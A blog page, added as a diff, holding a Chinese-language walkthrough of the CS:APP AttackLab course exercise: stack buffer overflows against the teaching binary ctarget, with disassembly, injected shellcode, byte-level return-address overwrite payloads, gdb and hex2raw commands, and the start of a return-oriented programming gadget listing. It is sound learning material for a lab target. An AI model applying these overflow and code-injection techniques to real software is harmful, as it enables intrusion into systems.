@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="wammr">
+
+
+
+
+
+
+
+<title>CS:APP AttackLab WP | Welcome to wa1king_pil0t&#39;s BLOG</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Frame.
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">Home</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">Archive</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/categories/gallery/">Gallery</a>
+              </li> 
+                   
+          
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
+                
+                    <span class="post-tag">
+                        <a href="/tags/CS-APP/">
+                            CS:APP
+                        </a>
+                    </span>    
+                           
+            
+        </div>
+        <div class="post-title">
+            
+            
+                CS:APP AttackLab WP
+            
+            
+        </div>
+        <span class="post-date">
+            9月 12, 2023
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <p>关卡1-3针对ctarget，4-5针对rtarget。</p>
+<p>ctarget执行命令： <code>./ctarget -q</code></p>
+<h1 id="Part-Ⅰ-Code-Injection-Attacks"><a href="#Part-Ⅰ-Code-Injection-Attacks" class="headerlink" title="Part Ⅰ:Code Injection Attacks"></a>Part Ⅰ:Code Injection Attacks</h1><h2 id="4-1-Level-1"><a href="#4-1-Level-1" class="headerlink" title="4.1 Level 1"></a>4.1 Level 1</h2><p>执行一次ctarget，发现给出一个cookie信息，同时提示让输入字符串，随便键入aaa，得到回显“No exploit . Getbuf returned 0x1. Normal return. ”。说明此时Getbuf函数正常返回了，没有造成栈溢出。接下来就要探究Getbuf函数，让其不正常返回。</p>
+<p><strong>目标：test调用Getbuf时，让其不正常返回，触发touch1函数中的 “Touch1!:  You called touch1()”</strong></p>
+<p>test函数调用getbuf函数，它们的代码分别如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = getbuf();</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;No exploit.  Getbuf returned 0x%x\n&quot;</span>, v0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  vlevel = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Touch1!: You called touch1()&quot;</span>);</span><br><span class="line">  validate(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来看一下test的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401968                 sub     rsp, 8</span><br><span class="line">.text:000000000040196C                 mov     eax, 0</span><br><span class="line">.text:0000000000401971                 call    getbuf</span><br><span class="line">.text:0000000000401976                 mov     edx, eax</span><br></pre></td></tr></table></figure>
+
+<p>在调用call getbuf的时候，先将0x401976压栈，再调用getbuf函数</p>
+<p>getbuf的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004017A8                 sub     rsp, 28h</span><br><span class="line">.text:00000000004017AC                 mov     rdi, rsp        ; dest</span><br><span class="line">.text:00000000004017AF                 call    Gets</span><br><span class="line">.text:00000000004017B4                 mov     eax, 1</span><br><span class="line">.text:00000000004017B9                 add     rsp, 28h</span><br><span class="line">.text:00000000004017BD                 retn</span><br></pre></td></tr></table></figure>
+
+<p>执行到retn的时候将栈上的0x401976 pop出来，跳转到返回地址</p>
+<p>栈上的情况大约如下图：</p>
+<p><img src="/pic/image-20230912163040078.png" alt="image-20230912163040078"></p>
+<p>touch1的汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004017C0                 sub     rsp, 8</span><br><span class="line">.text:00000000004017C4                 mov     cs:vlevel, 1</span><br><span class="line">.text:00000000004017CE                 mov     edi, offset aTouch1YouCalle ; &quot;Touch1!: You called touch1()&quot;</span><br><span class="line">.text:00000000004017D3                 call    _puts</span><br><span class="line">.text:00000000004017D8                 mov     edi, 1          ; level</span><br><span class="line">.text:00000000004017DD                 call    validate</span><br><span class="line">.text:00000000004017E2                 mov     edi, 0          ; status</span><br><span class="line">.text:00000000004017E7                 call    _exit</span><br></pre></td></tr></table></figure>
+
+<p>初始位置在0x4017C0，说明思路为先覆盖栈上的28h也就是40字节，再覆盖返回地址为0x4017c0</p>
+<p>，前40字节内容可随便输入</p>
+<p>覆盖内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">C0 17 40 00 00 00 00 00  #小端序</span><br></pre></td></tr></table></figure>
+
+<p>将其写入hex1当中，并用hex2raw将其转换成攻击字符串，写入answer1</p>
+<p><code>./hex2raw  &lt;  hex1  &gt;   answer1</code></p>
+<p>随后攻击</p>
+<p><code>./ctarget  &lt;  answer1  -q</code></p>
+<h2 id="4-2-Level-2"><a href="#4-2-Level-2" class="headerlink" title="4.2 Level 2"></a>4.2 Level 2</h2><p>查看touch2的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">  vlevel = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( val == cookie )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">    validate(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">    fail(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看其汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004017EC                 sub     rsp, 8</span><br><span class="line">.text:00000000004017F0                 mov     edx, edi</span><br><span class="line">.text:00000000004017F2                 mov     cs:vlevel, 2</span><br><span class="line">.text:00000000004017FC                 cmp     edi, cs:cookie</span><br><span class="line">.text:0000000000401802                 jnz     short loc_401824</span><br><span class="line">.text:0000000000401804                 mov     esi, offset aTouch2YouCalle ; &quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span><br><span class="line">.text:0000000000401809                 mov     edi, 1</span><br></pre></td></tr></table></figure>
+
+<p>比较edi和内存中cookie的值，如果不相等，就跳转走，否则触发“Touch2! …….”</p>
+<p><strong>目标：跳转到touch2函数中并设置edi的值为cookie的值</strong></p>
+<p>gdb调试ctarget，设置运行参数 <code>(gdb) set args -q -i answer1</code></p>
+<p>想查看getbuf的时候rsp寄存器的值，所以打个断点： <code>(gdb) b *0x4017AC</code></p>
+<p>r 开始执行，可以看到cookie的值为 <strong>0x59b997fa</strong></p>
+<p>到断点处查看rsp的值：  <code>(gdb) p $rsp</code></p>
+<p>或者可以用info registers(简称i r)来查看所有寄存器的值</p>
+<p>看到rsp的值为 <strong>0x5561dc78</strong> ，可以通过 <em>覆盖返回地址为rsp的值，在栈顶再放上给edi赋值的代码和跳转到touch2的代码</em>   实现目标</p>
+<p>先将要放到栈顶的代码写好，保存到inject2.s：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl  $0x59b997fa, %edi			# cookie值为0x59b997fa</span><br><span class="line">pushq $0x4017ec					# touch2的起始地址为0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+
+<p>实测了一下用Intel写汇编不行，还是要用AT&amp;T</p>
+<p>用gcc编译： <code>gcc -c inject2.s</code></p>
+<p>用objdump出机器码： <code>objdump -d inject2.o</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi</span><br><span class="line">   5:   68 ec 17 40 00          push   $0x4017ec</span><br><span class="line">   a:   c3                      ret</span><br></pre></td></tr></table></figure>
+
+<p>所以覆盖内容见以下，放到hex2中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>将hex2raw将字节码转换成攻击字符串：</p>
+<p><code>./hex2raw &lt; hex2 &gt;answer2</code></p>
+<p>再执行 ： <code>./ctarget &lt; answer2 -q</code></p>
+<p>此时栈的结构如下图所示：</p>
+<p><img src="/pic/image-20230913151421140.png" alt="image-20230913151421140"></p>
+<p>不过此种方法必非唯一方法，可以将返回地址定位在rsp+0x8h等地方，然后将攻击代码放在返回地址相应的位置上。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">bf fa 97 b9 59 68 ec 17</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">80 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>也一样能触发touch2</p>
+<h2 id="4-3-Level-3"><a href="#4-3-Level-3" class="headerlink" title="4.3 Level 3"></a>4.3 Level 3</h2><p>先看这关涉及到的hexmatch函数和touch3函数的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> val, <span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> cbuf[<span class="number">110</span>]; <span class="comment">// [rsp+0h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+78h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = &amp;cbuf[random() % <span class="number">100</span>];</span><br><span class="line">  __sprintf_chk(v2, <span class="number">1LL</span>, <span class="number">-1LL</span>, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, v2, <span class="number">9uLL</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">  vlevel = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( hexmatch(cookie, sval) )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    validate(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    fail(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到touch3调用hexmatch，hexmatch(cookie,sval) 用来对比sval地址中的值和cookie对比是否相等。</p>
+<p>查看touch3的部分汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004018FA ; void __fastcall touch3(char *sval)</span><br><span class="line">.text:00000000004018FA                 public touch3</span><br><span class="line">.text:00000000004018FA touch3          proc near</span><br><span class="line">.text:00000000004018FA sval = rdi                              ; char *</span><br><span class="line">.text:00000000004018FA ; __unwind &#123;</span><br><span class="line">.text:00000000004018FA                 push    rbx</span><br><span class="line">.text:00000000004018FB                 mov     rbx, sval</span><br><span class="line">.text:00000000004018FE                 mov     cs:vlevel, 3</span><br><span class="line">.text:0000000000401908                 mov     rsi, sval       ; sval</span><br><span class="line">.text:000000000040190B                 mov     edi, cs:cookie  ; val</span><br><span class="line">.text:0000000000401911 sval = rbx                              ; char *</span><br><span class="line">.text:0000000000401911                 call    hexmatch</span><br><span class="line">.text:0000000000401916                 test    eax, eax</span><br><span class="line">.text:0000000000401918                 jz      short loc_40193D</span><br><span class="line">.text:000000000040191A                 mov     rdx, sval</span><br><span class="line">.text:000000000040191D                 mov     esi, offset aTouch3YouCalle ; &quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注意其中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401908                 mov     rsi, sval       ; sval</span><br><span class="line">.text:000000000040190B                 mov     edi, cs:cookie  ; val</span><br><span class="line">.text:0000000000401911                 call    hexmatch</span><br></pre></td></tr></table></figure>
+
+<p>可以看到touch3把rdi中的内容给了rsi，然后又把cookie的值给rdi，之后以rdi和rsi为参数调用hexmatch。调用hexmatch时，rdi里是cookie的值，rsi里是某地址的值，rsi地址中索引到的值需要跟rdi中的cookie值相等，才能通关。</p>
+<p>这也就需要在某个位置放置一个和cookie相同的字符串，并将这个地址传给rdi，再进行touch3的调用。</p>
+<p>不过这个字符串应该放在哪里呢？通过观察hexmatch的汇编可以看到它开辟了很大的一部分栈空间，这会导致覆盖之前getbuf栈空间所在的位置，如果将字符串写在getbuf的栈帧中并不合适，所以考虑将字符串写在test函数的栈帧中，毕竟其在高地址，不会受影响。</p>
+<p>分析到这可以理清大概思路：</p>
+<p><em><strong>通过getbuf覆盖栈空间，在test栈帧中写入cookie字符串，通过在栈上执行代码，把字符串的地址给了rdi，然后跳转到touch3，touch3上来把rdi中的内容给rsi，然后又把cookie的值给rdi，之后以rdi和rsi为参数调用hexmatch。调用hexmatch时，rdi里是cookie的值，rsi里是存到test栈帧中的字符串地址（此字符串与cookie值相同），然后就满足了二者相等，通关</strong></em></p>
+<p>栈上的情况如图所示：</p>
+<p><img src="/pic/image-20231002204036331.png" alt="image-20231002204036331"></p>
+<p>构造输入字符串：</p>
+<p>将以下代码保存到inject3.s</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi		# 将cookie字符串放到test栈帧中，也就是(0x5561dca0)+0x8处 </span><br><span class="line">pushq $0x4018fa				# 将touch3起始地址压栈 </span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+
+<p>然后再<code>gcc -c inject3.s</code> 以及 <code>objdump -d inject3.o</code></p>
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          push   $0x4018fa</span><br><span class="line">   c:   c3                      ret</span><br></pre></td></tr></table></figure>
+
+<p>将Cookie字符串<code>59b997fa</code>转成ASCII码有 <code>35 39 62 39 39 37 66 61</code></p>
+<p>构造的字符串如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 </span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<h1 id="Part-Ⅱ-Return-Oriented-Programming"><a href="#Part-Ⅱ-Return-Oriented-Programming" class="headerlink" title="Part Ⅱ:Return-Oriented Programming"></a>Part Ⅱ:Return-Oriented Programming</h1><h2 id="5-1-Level-2"><a href="#5-1-Level-2" class="headerlink" title="5.1 Level 2"></a>5.1 Level 2</h2><p>查看start_farm和mid_farm之间可用的gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:       b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  401999:       c3                      ret</span><br><span class="line"></span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:       b8 fb 78 90 90          mov    $0x909078fb,%eax</span><br><span class="line">  40199f:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:       c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:       c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:       c7 07 63 48 8d c7       movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:       b8 29 58 90 c3          mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000004019d0 &lt;mid_farm&gt;:</span><br><span class="line">  4019d0:       b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4019d5:       c3                      ret</span><br></pre></td></tr></table></figure>
+
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2023/09/16/buuctf-pwn-WP/">Prev</a>
+                </div>
+            
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2023/09/11/Fuzzing-101-exercise-9/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+     
+
+     
+    
+    
+
+</div>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+    
+    
+
+  </body>
+</html>
